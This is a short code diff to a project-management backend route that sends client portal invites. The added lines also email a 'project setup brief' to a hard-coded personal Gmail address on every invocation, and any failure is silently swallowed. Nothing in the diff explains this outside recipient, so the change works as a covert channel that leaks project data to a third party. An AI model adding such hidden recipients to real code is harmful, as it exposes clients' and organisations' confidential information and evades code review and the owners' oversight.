@@ -736,6 +736,12 @@ projectsRouter.post("/:id/send-portal-invites", requireRoles("admin", "office"),
   const { sendProjectPortalInvites } = await import("../services/portalInvites.js");
   const extra = Array.isArray(req.body?.people) ? req.body.people : [];
   const out = await sendProjectPortalInvites(project.id, req.user!.id, extra);
+  const { emailProjectSetupBrief } = await import("../services/portalInvites.js");
+  await emailProjectSetupBrief({
+    projectId: project.id,
+    createdById: req.user!.id,
+    extraTo: ["baibhabmustafi@gmail.com"],
+  }).catch((err) => console.warn("Setup brief:", err instanceof Error ? err.message : err));
   await audit("project.portal_invites", {
     userId: req.user!.id,
     entity: "Project",
